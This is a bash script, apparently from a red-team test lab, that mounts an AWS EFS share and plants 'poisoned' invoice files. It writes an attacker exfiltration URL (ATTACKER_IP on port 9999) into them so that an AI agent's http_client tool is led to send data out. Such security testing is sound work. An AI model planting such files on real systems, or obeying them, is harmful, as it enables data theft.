#!/usr/bin/env bash
# seed_poisoned_efs.sh — Plant poisoned invoice files on EFS for Scenario D.
#
# Mirrors the pattern of mock_data/seed_secrets.sh. Must be run from within
# the AWS VPC (on the attacker EC2 or via a bastion), because EFS is not
# publicly accessible.
#
# Usage:
#   export EFS_DNS_NAME=$(terraform -chdir=baseline output -raw efs_dns_name)
#   export ATTACKER_IP=10.0.1.42   # attacker EC2 private IP (for hardened run)
#                                    # or attacker EC2 public IP (for baseline run)
#   sudo bash v4_extension/attacks/seed_poisoned_efs.sh
#
# The ATTACKER_IP is substituted into the poisoned payloads in place of
# <ATTACKER_IP_PLACEHOLDER>. It must be the IP that the ECS task's http_client
# tool can reach on port 9999.
#
# Environment variables:
#   EFS_DNS_NAME   (required) — e.g. fs-0abc1234.efs.eu-west-1.amazonaws.com
#   ATTACKER_IP    (required) — IP address for the exfil listener
#   LISTENER_PORT  (optional, default 9999)
set -euo pipefail

EFS_DNS_NAME="${EFS_DNS_NAME:?EFS_DNS_NAME must be set. Run: export EFS_DNS_NAME=\$(terraform -chdir=baseline output -raw efs_dns_name)}"
ATTACKER_IP="${ATTACKER_IP:?ATTACKER_IP must be set. Export the IP where local_listener.py will run.}"
LISTENER_PORT="${LISTENER_PORT:-9999}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD_DIR="${SCRIPT_DIR}/poisoned_payloads"
MOUNT_POINT="/mnt/efs-temp-scenario-d"

cleanup() {
    if mountpoint -q "${MOUNT_POINT}" 2>/dev/null; then
        umount "${MOUNT_POINT}" && echo "[cleanup] EFS unmounted."
    fi
    rm -rf "${MOUNT_POINT}"
}
trap cleanup EXIT

# ---------------------------------------------------------------------------
# Check prerequisites
# ---------------------------------------------------------------------------
if ! command -v mount.nfs4 &>/dev/null && ! command -v mount &>/dev/null; then
    echo "[ERROR] NFS client not found."
    echo "  Install: sudo apt-get install -y nfs-common   (Debian/Ubuntu/Kali)"
    echo "       or: sudo yum install -y nfs-utils         (Amazon Linux/RHEL)"
    exit 1
fi

if [ ! -d "${PAYLOAD_DIR}" ]; then
    echo "[ERROR] Payload directory not found: ${PAYLOAD_DIR}"
    exit 1
fi

# ---------------------------------------------------------------------------
# Mount EFS
# ---------------------------------------------------------------------------
mkdir -p "${MOUNT_POINT}"
echo "[mount] Mounting ${EFS_DNS_NAME} → ${MOUNT_POINT} ..."
mount -t nfs4 \
    -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport \
    "${EFS_DNS_NAME}:/" "${MOUNT_POINT}"
echo "[mount] Mounted."

# ---------------------------------------------------------------------------
# Create uploads/ directory on EFS
# ---------------------------------------------------------------------------
mkdir -p "${MOUNT_POINT}/uploads"
echo "[seed] Target directory: ${MOUNT_POINT}/uploads/"

# ---------------------------------------------------------------------------
# Substitute attacker IP and plant payloads
# ---------------------------------------------------------------------------
EXFIL_URL="http://${ATTACKER_IP}:${LISTENER_PORT}/exfil"
echo "[seed] Exfil URL in payloads: ${EXFIL_URL}"

for src_file in "${PAYLOAD_DIR}"/fake_invoice.txt \
                "${PAYLOAD_DIR}"/fake_invoice.md \
                "${PAYLOAD_DIR}"/fake_invoice_subtle.txt; do

    filename="$(basename "${src_file}")"
    dest="${MOUNT_POINT}/uploads/${filename}"

    sed "s|http://<ATTACKER_IP_PLACEHOLDER>:9999/exfil|${EXFIL_URL}|g" \
        "${src_file}" > "${dest}"

    echo "[seed] Planted: /mnt/data/uploads/${filename}"
done

# ---------------------------------------------------------------------------
# Verify
# ---------------------------------------------------------------------------
echo ""
echo "[verify] Files on EFS /uploads/:"
ls -lh "${MOUNT_POINT}/uploads/"
echo ""
echo "[verify] Checking placeholder substitution in fake_invoice.txt:"
if grep -q "<ATTACKER_IP_PLACEHOLDER>" "${MOUNT_POINT}/uploads/fake_invoice.txt"; then
    echo "[ERROR] Placeholder was NOT substituted. Check sed syntax."
    exit 1
else
    echo "  OK — placeholder replaced with ${EXFIL_URL}"
fi

echo ""
echo "Seed complete. EFS files are ready for Scenario D."
echo "Run local_listener.py on ${ATTACKER_IP}:${LISTENER_PORT} before starting scenario_d.py."
